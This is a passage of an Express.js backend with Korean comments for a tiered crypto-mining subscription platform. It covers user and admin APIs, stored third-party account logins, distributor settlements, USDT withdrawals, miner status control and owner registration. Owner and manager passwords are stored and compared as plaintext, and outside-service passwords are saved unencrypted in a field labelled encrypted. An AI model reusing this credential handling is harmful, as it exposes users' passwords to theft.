      return res.status(400).json({ error: 'ID와 비밀번호를 입력하세요.' });
    }
    const hash = muHashPassword(password.trim());
    const [[user]] = await db.pool.query(
      'SELECT id, name, login_id, role, status FROM mu_users WHERE login_id = ? AND password_hash = ?',
      [login_id.trim(), hash]
    );
    if (!user) return res.status(401).json({ error: 'ID 또는 비밀번호가 올바르지 않습니다.' });
    if (user.status !== 'active') return res.status(403).json({ error: '비활성 계정입니다.' });
    const token = muCreateToken();
    await db.pool.query('INSERT INTO mu_sessions (user_id, token) VALUES (?, ?)', [user.id, token]);
    res.json({ ok: true, token, user: { id: user.id, name: user.name, loginId: user.login_id, role: user.role } });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/mu/logout', requireMuAuth, async (req, res) => {
  try {
    const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.muToken || '';
    await db.pool.query('DELETE FROM mu_sessions WHERE token = ?', [token]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/mu/me', requireMuAuth, (req, res) => {
  res.json({ ok: true, user: req.muUser });
});

// ----- ADMIN 전용 API -----

// 전체 유저 목록 (계정 집계 포함)
app.get('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const [users] = await db.pool.query(`
      SELECT u.id, u.name, u.login_id, u.role, u.status, u.created_at,
        COUNT(a.id)                                            AS total_accounts,
        SUM(a.account_status = 'ACTIVE')                      AS active_accounts,
        SUM(a.account_status = 'ERROR')                       AS error_accounts,
        SUM(a.account_status = 'EXPIRED')                     AS expired_accounts,
        SUM(a.connection_status = 'DISCONNECTED')             AS disconnected_accounts,
        MAX(a.last_checked_at)                                AS last_checked_at
      FROM mu_users u
      LEFT JOIN managed_accounts a ON a.owner_user_id = u.id
      GROUP BY u.id
      ORDER BY u.created_at DESC
    `);
    res.json({ ok: true, users });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 유저 생성
app.post('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const { name, login_id, password, role } = req.body || {};
    if (!name?.trim() || !login_id?.trim() || !password?.trim()) {
      return res.status(400).json({ error: '이름, ID, 비밀번호는 필수입니다.' });
    }
    const validRole = ['ADMIN', 'USER'].includes(role) ? role : 'USER';
    const hash = muHashPassword(password.trim());
    const [result] = await db.pool.query(
      'INSERT INTO mu_users (name, login_id, password_hash, role) VALUES (?, ?, ?, ?)',
      [name.trim(), login_id.trim(), hash, validRole]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    if (e.code === 'ER_DUP_ENTRY') return res.status(409).json({ error: '이미 사용 중인 ID입니다.' });
    res.status(500).json({ error: e.message });
  }
});

// 유저 수정/정지
app.patch('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);
    const { name, password, role, status } = req.body || {};
    const fields = [];
    const vals = [];
    if (name?.trim()) { fields.push('name = ?'); vals.push(name.trim()); }
    if (password?.trim()) { fields.push('password_hash = ?'); vals.push(muHashPassword(password.trim())); }
    if (['ADMIN', 'USER'].includes(role)) { fields.push('role = ?'); vals.push(role); }
    if (['active', 'inactive'].includes(status)) { fields.push('status = ?'); vals.push(status); }
    if (fields.length === 0) return res.status(400).json({ error: '수정할 항목이 없습니다.' });
    vals.push(userId);
    await db.pool.query(`UPDATE mu_users SET ${fields.join(', ')} WHERE id = ?`, vals);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 유저 삭제
app.delete('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);
    await db.pool.query('DELETE FROM mu_users WHERE id = ?', [userId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 특정 유저의 계정 목록
app.get('/api/mu/admin/users/:userId/accounts', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.userId);
    const [accounts] = await db.pool.query(`
      SELECT a.*,
        t.task_type AS last_task_type, t.task_status AS last_task_status, t.ended_at AS last_task_ended_at
      FROM managed_accounts a
      LEFT JOIN managed_account_tasks t ON t.id = (
        SELECT id FROM managed_account_tasks WHERE managed_account_id = a.id ORDER BY created_at DESC LIMIT 1
      )
      WHERE a.owner_user_id = ?
      ORDER BY a.created_at ASC
    `, [userId]);
    res.json({ ok: true, accounts });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 계정 생성 (관리자)
app.post('/api/mu/admin/accounts', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const { owner_user_id, account_name, external_service_name, login_id, login_password, memo } = req.body || {};
    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id는 필수입니다.' });
    const [result] = await db.pool.query(
      `INSERT INTO managed_accounts
        (owner_user_id, account_name, external_service_name, login_id, login_password_encrypted, memo)
       VALUES (?, ?, ?, ?, ?, ?)`,
      [owner_user_id, account_name || null, external_service_name || null,
       login_id || null, login_password || null, memo || null]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 계정 상태 변경 (관리자)
app.patch('/api/mu/admin/accounts/:accountId/status', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    const { account_status, connection_status } = req.body || {};
    const fields = [];
    const vals = [];
    const validAS = ['PENDING','ACTIVE','SUSPENDED','EXPIRED','ERROR'];
    const validCS = ['CONNECTED','DISCONNECTED','CHECKING'];
    if (validAS.includes(account_status)) { fields.push('account_status = ?'); vals.push(account_status); }
    if (validCS.includes(connection_status)) { fields.push('connection_status = ?'); vals.push(connection_status); }
    if (fields.length === 0) return res.status(400).json({ error: '변경할 상태가 없습니다.' });
    vals.push(accountId);
    await db.pool.query(`UPDATE managed_accounts SET ${fields.join(', ')} WHERE id = ?`, vals);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 계정 소유자 재할당 (관리자)
app.patch('/api/mu/admin/accounts/:accountId/reassign', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    const { owner_user_id } = req.body || {};
    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id는 필수입니다.' });
    await db.pool.query('UPDATE managed_accounts SET owner_user_id = ? WHERE id = ?', [owner_user_id, accountId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 계정 삭제 (관리자)
app.delete('/api/mu/admin/accounts/:accountId', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    await db.pool.query('DELETE FROM managed_accounts WHERE id = ?', [accountId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 계정 로그 추가 (관리자)
app.post('/api/mu/admin/accounts/:accountId/logs', requireMuAuth, requireMuAdmin, async (req, res) => {
  try {
    const accountId = parseInt(req.params.accountId);
    const { event_type, message, payload_json } = req.body || {};
    await db.pool.query(
      'INSERT INTO managed_account_logs (managed_account_id, event_type, message, payload_json) VALUES (?, ?, ?, ?)',
      [accountId, event_type || null, message || null, payload_json ? JSON.stringify(payload_json) : null]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ----- USER 전용 API -----

// 내 계정 목록
app.get('/api/mu/my/accounts', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const { status, connection } = req.query;
    let where = 'WHERE a.owner_user_id = ?';
    const params = [userId];
    if (status) { where += ' AND a.account_status = ?'; params.push(status.toUpperCase()); }
    if (connection) { where += ' AND a.connection_status = ?'; params.push(connection.toUpperCase()); }
    const [accounts] = await db.pool.query(`
      SELECT a.*,
        t.task_type AS last_task_type, t.task_status AS last_task_status, t.ended_at AS last_task_ended_at
      FROM managed_accounts a
      LEFT JOIN managed_account_tasks t ON t.id = (
        SELECT id FROM managed_account_tasks WHERE managed_account_id = a.id ORDER BY created_at DESC LIMIT 1
      )
      ${where}
      ORDER BY FIELD(a.account_status,'ERROR','EXPIRED','SUSPENDED','PENDING','ACTIVE'), a.created_at ASC
    `, params);

    // 요약 집계
    const [allAccounts] = await db.pool.query(
      'SELECT account_status, connection_status FROM managed_accounts WHERE owner_user_id = ?', [userId]
    );
    const summary = {
      total: allAccounts.length,
      active: allAccounts.filter(a => a.account_status === 'ACTIVE').length,
      error: allAccounts.filter(a => a.account_status === 'ERROR').length,
      expired: allAccounts.filter(a => a.account_status === 'EXPIRED').length,
      suspended: allAccounts.filter(a => a.account_status === 'SUSPENDED').length,
      pending: allAccounts.filter(a => a.account_status === 'PENDING').length,
      disconnected: allAccounts.filter(a => a.connection_status === 'DISCONNECTED').length,
    };
    res.json({ ok: true, summary, accounts });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 내 계정 상세
app.get('/api/mu/my/accounts/:accountId', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[account]] = await db.pool.query(
      'SELECT * FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!account) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
    res.json({ ok: true, account });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 내 계정 메모 수정
app.patch('/api/mu/my/accounts/:accountId/memo', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const { memo } = req.body || {};
    const [result] = await db.pool.query(
      'UPDATE managed_accounts SET memo = ? WHERE id = ? AND owner_user_id = ?',
      [memo || null, accountId, userId]
    );
    if (result.affectedRows === 0) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 내 계정 로그 조회
app.get('/api/mu/my/accounts/:accountId/logs', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[owns]] = await db.pool.query(
      'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!owns) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const [logs] = await db.pool.query(
      'SELECT * FROM managed_account_logs WHERE managed_account_id = ? ORDER BY created_at DESC LIMIT ?',
      [accountId, limit]
    );
    res.json({ ok: true, logs });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 내 계정 작업 이력 조회
app.get('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[owns]] = await db.pool.query(
      'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!owns) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const [tasks] = await db.pool.query(
      'SELECT * FROM managed_account_tasks WHERE managed_account_id = ? ORDER BY created_at DESC LIMIT ?',
      [accountId, limit]
    );
    res.json({ ok: true, tasks });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// 내 계정 작업 추가
app.post('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) => {
  try {
    const userId = req.muUser.id;
    const accountId = parseInt(req.params.accountId);
    const [[owns]] = await db.pool.query(
      'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
    );
    if (!owns) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
    const { task_type } = req.body || {};
    const [result] = await db.pool.query(
      'INSERT INTO managed_account_tasks (managed_account_id, task_type) VALUES (?, ?)',
      [accountId, task_type || 'manual']
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== 총판(매니저)용 API ==========

// GET /api/admin/my/settlements — 본인 정산 내역 + 누적 잔액
app.get('/api/admin/my/settlements', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.id;
    let page = Math.max(1, parseInt(req.query.page, 10) || 1);
    let pageSize = Math.min(100, Math.max(1, parseInt(req.query.pageSize, 10) || 20));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) as total FROM settlements WHERE manager_id = ?', [managerId]
    );
    const [records] = await db.pool.query(
      `SELECT s.id, s.user_id, s.payment_amount, s.settlement_rate, s.settlement_amount, s.payment_type, s.created_at
       FROM settlements s WHERE s.manager_id = ? ORDER BY s.created_at DESC LIMIT ? OFFSET ?`,
      [managerId, pageSize, offset]
    );
    // 누적 정산 총액
    const [[{ totalEarned }]] = await db.pool.query(
      'SELECT COALESCE(SUM(settlement_amount), 0) as totalEarned FROM settlements WHERE manager_id = ?',
      [managerId]
    );
    // 출금된 금액
    const [[{ totalWithdrawn }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as totalWithdrawn FROM withdrawal_requests WHERE manager_id = ? AND status = "approved"',
      [managerId]
    );
    const balance = Number(totalEarned) - Number(totalWithdrawn);
    res.json({ total, page, pageSize, records, totalEarned: Number(totalEarned), totalWithdrawn: Number(totalWithdrawn), balance });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/my/withdrawals — 본인 출금 신청 목록
app.get('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.id;
    const [rows] = await db.pool.query(
      'SELECT id, amount, wallet_address, status, reject_reason, requested_at, processed_at FROM withdrawal_requests WHERE manager_id = ? ORDER BY requested_at DESC',
      [managerId]
    );
    res.json({ withdrawals: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/my/withdrawals — 출금 신청 (매월 1일만 가능)
app.post('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.id;
    const now = new Date();
    if (now.getDate() !== 1) {
      return res.status(400).json({ error: '출금 신청은 매월 1일에만 가능합니다.' });
    }
    const { amount, wallet_address } = req.body || {};
    if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
      return res.status(400).json({ error: '유효한 금액을 입력하세요.' });
    }
    // 잔액 확인
    const [[{ totalEarned }]] = await db.pool.query(
      'SELECT COALESCE(SUM(settlement_amount), 0) as totalEarned FROM settlements WHERE manager_id = ?',
      [managerId]
    );
    const [[{ totalWithdrawn }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as totalWithdrawn FROM withdrawal_requests WHERE manager_id = ? AND status = "approved"',
      [managerId]
    );
    // 대기 중인 출금 신청 합계도 차감
    const [[{ pendingAmount }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as pendingAmount FROM withdrawal_requests WHERE manager_id = ? AND status = "pending"',
      [managerId]
    );
    const balance = Number(totalEarned) - Number(totalWithdrawn) - Number(pendingAmount);
    if (Number(amount) > balance) {
      return res.status(400).json({ error: `출금 가능 잔액(${balance.toFixed(4)} USDT)을 초과합니다.` });
    }
    const [result] = await db.pool.query(
      'INSERT INTO withdrawal_requests (manager_id, amount, wallet_address) VALUES (?, ?, ?)',
      [managerId, Number(amount), wallet_address?.trim() || null]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/users/:id/miner — 특정 회원 채굴기 상태 조회
app.get('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '소속 회원만 조회할 수 있습니다.' });
      }
    }
    const [[row]] = await db.pool.query(
      'SELECT status, coin_type, assigned_at FROM miner_status WHERE user_id = ?',
      [targetId]
    );
    res.json({ status: row?.status || 'stopped', coin_type: row?.coin_type || 'BTC', assigned_at: row?.assigned_at || null });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/users/:id/miner — 채굴기 상태 제어 (running/stopped)
app.patch('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    const { status, coin_type } = req.body || {};
    if (!['running', 'stopped'].includes(status)) {
      return res.status(400).json({ error: 'status는 running 또는 stopped' });
    }
    // 매니저는 자기 소속 회원만 제어 가능
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '소속 회원만 제어할 수 있습니다.' });
      }
    }
    const coinType = coin_type?.trim() || 'BTC';
    const assignedAt = status === 'running' ? new Date() : null;
    await db.pool.query(
      `INSERT INTO miner_status (user_id, status, coin_type, assigned_at)
       VALUES (?, ?, ?, ?)
       ON DUPLICATE KEY UPDATE status = VALUES(status), coin_type = VALUES(coin_type), assigned_at = VALUES(assigned_at)`,
      [targetId, status, coinType, assignedAt]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/mining-records — 채굴 기록 추가 (매니저/마스터)
app.post('/api/admin/mining-records', requireAdmin, async (req, res) => {
  try {
    const { user_id, coin_type, amount, mined_at, note } = req.body || {};
    if (!user_id || !amount || isNaN(Number(amount))) {
      return res.status(400).json({ error: 'user_id, amount 필수' });
    }
    const targetId = user_id.toLowerCase();
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '소속 회원만 관리할 수 있습니다.' });
      }
    }
    const [result] = await db.pool.query(
      'INSERT INTO mining_records (user_id, coin_type, amount, mined_at, note) VALUES (?, ?, ?, ?, ?)',
      [targetId, coin_type || 'BTC', Number(amount), mined_at || new Date(), note || null]
    );
    res.json({ ok: true, id: result.insertId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// DELETE /api/admin/mining-records/:id — 채굴 기록 삭제 (마스터 전용)
app.delete('/api/admin/mining-records/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    await db.pool.query('DELETE FROM mining_records WHERE id = ?', [req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/users/:id/mining-records — 특정 회원 채굴 내역 (매니저/마스터)
app.get('/api/admin/users/:id/mining-records', requireAdmin, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    if (req.admin.role !== 'master') {
      const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
      if (!user || user.manager_id !== req.admin.id) {
        return res.status(403).json({ error: '소속 회원만 조회할 수 있습니다.' });
      }
    }
    const [records] = await db.pool.query(
      'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT 100',
      [targetId]
    );
    const [[{ cumulative }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as cumulative FROM mining_records WHERE user_id = ?',
      [targetId]
    );
    res.json({ records, cumulative: Number(cumulative) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== 마스터 전용 API (정산 관리) ==========

// GET /api/admin/settlements — 전체 정산 내역
app.get('/api/admin/settlements', requireAdmin, requireMaster, async (req, res) => {
  try {
    let page = Math.max(1, parseInt(req.query.page, 10) || 1);
    let pageSize = Math.min(100, Math.max(1, parseInt(req.query.pageSize, 10) || 30));
    const offset = (page - 1) * pageSize;
    const managerId = req.query.manager_id || null;
    const whereClause = managerId ? 'WHERE manager_id = ?' : '';
    const params = managerId ? [managerId] : [];
    const [[{ total }]] = await db.pool.query(
      `SELECT COUNT(*) as total FROM settlements ${whereClause}`, params
    );
    const [records] = await db.pool.query(
      `SELECT id, manager_id, user_id, payment_amount, settlement_rate, settlement_amount, payment_type, created_at
       FROM settlements ${whereClause} ORDER BY created_at DESC LIMIT ? OFFSET ?`,
      [...params, pageSize, offset]
    );
    res.json({ total, page, pageSize, records });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/managers/:id/settlement-rate — 정산 비율 설정
app.patch('/api/admin/managers/:id/settlement-rate', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { rate } = req.body || {};
    if (rate === undefined || isNaN(Number(rate)) || Number(rate) < 0 || Number(rate) > 100) {
      return res.status(400).json({ error: '비율은 0~100 사이여야 합니다.' });
    }
    await db.pool.query('UPDATE managers SET settlement_rate = ? WHERE id = ? AND role = "manager"', [Number(rate), req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/withdrawals — 전체 출금 신청 목록 (status, manager_id 필터 지원)
app.get('/api/admin/withdrawals', requireAdmin, requireMaster, async (req, res) => {
  try {
    const status    = req.query.status     || null;
    const managerId = req.query.manager_id || null;
    const conds  = [];
    const params = [];
    if (status)    { conds.push('status = ?');     params.push(status); }
    if (managerId) { conds.push('manager_id = ?'); params.push(managerId); }
    const whereClause = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
    const [rows] = await db.pool.query(
      `SELECT id, manager_id, amount, wallet_address, status, reject_reason, requested_at, processed_at
       FROM withdrawal_requests ${whereClause} ORDER BY requested_at DESC`,
      params
    );
    res.json({ withdrawals: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/admin/withdrawals/:id — 출금 승인/거절
app.patch('/api/admin/withdrawals/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { action, reject_reason } = req.body || {};
    if (!['approve', 'reject'].includes(action)) {
      return res.status(400).json({ error: 'action은 approve 또는 reject' });
    }
    const [[wr]] = await db.pool.query('SELECT * FROM withdrawal_requests WHERE id = ?', [req.params.id]);
    if (!wr) return res.status(404).json({ error: '출금 신청을 찾을 수 없습니다.' });
    if (wr.status !== 'pending') return res.status(400).json({ error: '이미 처리된 신청입니다.' });
    const newStatus = action === 'approve' ? 'approved' : 'rejected';
    await db.pool.query(
      'UPDATE withdrawal_requests SET status = ?, reject_reason = ?, processed_at = NOW() WHERE id = ?',
      [newStatus, action === 'reject' ? (reject_reason || '') : null, req.params.id]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/master/settlement-overview — 마스터 정산 전체 개요
app.get('/api/admin/master/settlement-overview', requireAdmin, requireMaster, async (req, res) => {
  try {
    // 총 수금액 (모든 결제의 합산 — settlements.payment_amount 기준)
    const [[{ total_collected }]] = await db.pool.query(
      'SELECT COALESCE(SUM(payment_amount), 0) as total_collected FROM settlements'
    );
    // 총판 전체 누적 인센티브 (지급 예정 포함)
    const [[{ total_settlement }]] = await db.pool.query(
      'SELECT COALESCE(SUM(settlement_amount), 0) as total_settlement FROM settlements'
    );
    // 이미 지급 완료된 금액 (approved 출금)
    const [[{ total_paid_out }]] = await db.pool.query(
      "SELECT COALESCE(SUM(amount), 0) as total_paid_out FROM withdrawal_requests WHERE status = 'approved'"
    );
    // 아직 지급 안 한 금액 (총판 잔액 합계 = 줘야 하는 금액)
    const pending_payout = Number(total_settlement) - Number(total_paid_out);
    // 마스터 순수익 = 총 수금 - 총판 인센티브 전체
    const master_net = Number(total_collected) - Number(total_settlement);

    res.json({
      total_collected: Number(total_collected),   // 총 회수 금액
      total_settlement: Number(total_settlement),  // 총판 인센티브 합계
      total_paid_out: Number(total_paid_out),      // 이미 지급한 금액
      pending_payout: pending_payout,              // 아직 줘야 하는 금액
      master_net: master_net,                      // 마스터 순수익
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/managers/settlement-summary — 총판별 정산 요약
app.get('/api/admin/managers/settlement-summary', requireAdmin, requireMaster, async (req, res) => {
  try {
    const [rows] = await db.pool.query(
      `SELECT m.id, m.telegram, m.memo, m.settlement_rate,
              COALESCE(s.total_earned, 0) as total_earned,
              COALESCE(w.total_withdrawn, 0) as total_withdrawn,
              COALESCE(s.total_earned, 0) - COALESCE(w.total_withdrawn, 0) as balance
       FROM managers m
       LEFT JOIN (SELECT manager_id, SUM(settlement_amount) as total_earned FROM settlements GROUP BY manager_id) s ON m.id = s.manager_id
       LEFT JOIN (SELECT manager_id, SUM(amount) as total_withdrawn FROM withdrawal_requests WHERE status = 'approved' GROUP BY manager_id) w ON m.id = w.manager_id
       WHERE m.role = 'manager'
       ORDER BY m.id`
    );
    res.json({ managers: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ========== 그룹 오너 API ==========

// POST /api/owner/register — 공개 오너 가입 (pending 상태로 등록, 담당 매니저에게 텔레그램 알림)
app.post('/api/owner/register', async (req, res) => {
  try {
    const { id, password, name, telegram, referralCode } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
    const ownerId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
    if (exists) return res.status(400).json({ error: '이미 사용 중인 아이디입니다.' });

    let managerId = null;
    if (referralCode?.trim()) {
      const [[mgr]] = await db.pool.query("SELECT id FROM admins WHERE id = ? AND role IN ('manager','master')", [referralCode.trim()]);
      if (!mgr) return res.status(400).json({ error: '유효하지 않은 추천인 코드입니다.' });
      managerId = mgr.id;
    }

    await db.pool.query(
      'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
      [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, managerId, 'pending']
    );

    // 담당 매니저에게 텔레그램 알림
    if (managerId) {
      try {
        const [[mgr]] = await db.pool.query('SELECT tg_bot_token, tg_chat_id FROM admins WHERE id = ?', [managerId]);
        if (mgr?.tg_bot_token && mgr?.tg_chat_id) {
          await sendTelegram(
            mgr.tg_bot_token, mgr.tg_chat_id,
            `📩 <b>오너 가입 요청</b>\n아이디: <code>${ownerId}</code>\n이름: ${name?.trim() || '-'}\n텔레그램: ${telegram?.trim() || '-'}`
          );
        }
      } catch (tgErr) { console.warn('오너 가입 텔레그램 알림 실패:', tgErr.message); }
    }

    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/login
app.post('/api/owner/login', async (req, res) => {
  try {
    const { id, password } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });

    // 1) account_owners 테이블에서 먼저 확인
    const [[owner]] = await db.pool.query(
      'SELECT id, name, telegram, manager_id, status FROM account_owners WHERE id = ? AND pw = ?',
      [id.trim().toLowerCase(), password.trim()]
    );
    if (owner) {
      if (owner.status === 'pending')  return res.status(403).json({ error: '관리자 승인 대기 중입니다.' });
      if (owner.status === 'rejected') return res.status(403).json({ error: '가입이 거절되었습니다. 관리자에게 문의하세요.' });
      const token = crypto.randomBytes(24).toString('hex');
      await db.pool.query('INSERT INTO owner_sessions (token, owner_id) VALUES (?, ?)', [token, owner.id]);
      return res.json({ token, id: owner.id, name: owner.name || owner.id, telegram: owner.telegram || '', role: 'owner' });
    }

    // 2) admins 테이블에서 manager 계정도 허용
    const [[mgr]] = await db.pool.query(
      "SELECT id, telegram FROM admins WHERE id=? AND pw=? AND role='manager'",
      [id.trim().toLowerCase(), password.trim()]
    );
    if (mgr) {
      // manager는 owner_sessions에 등록 후 owner처럼 사용
      const token = crypto.randomBytes(24).toString('hex');
      await db.pool.query('INSERT INTO owner_sessions (token, owner_id) VALUES (?, ?)', [token, mgr.id]);
      return res.json({ token, id: mgr.id, name: mgr.id, telegram: mgr.telegram || '', role: 'manager' });
    }

    return res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/owner/logout
app.post('/api/owner/logout', async (req, res) => {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.body?.token || '';
  if (token) await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]).catch(() => {});
  res.json({ ok: true });
});

// GET /api/owner/me
app.get('/api/owner/me', requireOwnerSession, async (req, res) => {
  res.json({ id: req.owner.id, name: req.owner.name, telegram: req.owner.telegram });
});

// GET /api/owner/accounts — 연결된 유저 계정 목록 + 상태
app.get('/api/owner/accounts', requireOwnerSession, async (req, res) => {
  try {
    const [users] = await db.pool.query(
      `SELECT u.id, u.telegram, u.status, u.expire_date, u.subscription_days,
              ms.status as miner_status, ms.coin_type
       FROM users u
       LEFT JOIN miner_status ms ON ms.user_id = u.id
       WHERE u.owner_id = ?
       ORDER BY u.id`,
      [req.owner.id]
    );
    const now = new Date();
    const result = users.map(u => {
      const exp = u.expire_date ? new Date(u.expire_date) : null;
      const remainingDays = exp ? Math.ceil((exp - now) / 86400000) : 0;
      return {
        id: u.id,
        telegram: u.telegram || '',
        status: u.status,
        expireDate: u.expire_date || null,
        remainingDays,
        isExpired: exp ? now > exp : true,
        minerStatus: u.miner_status || 'stopped',
        coinType: u.coin_type || 'BTC',
      };
    });
    res.json({ accounts: result, total: result.length });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/owner/accounts/:id/password — 기기 비밀번호 변경 (오너/매니저만)
app.patch('/api/owner/accounts/:id/password', requireOwnerSession, async (req, res) => {
  try {
    const targetId = req.params.id.toLowerCase();
    const { new_password } = req.body || {};
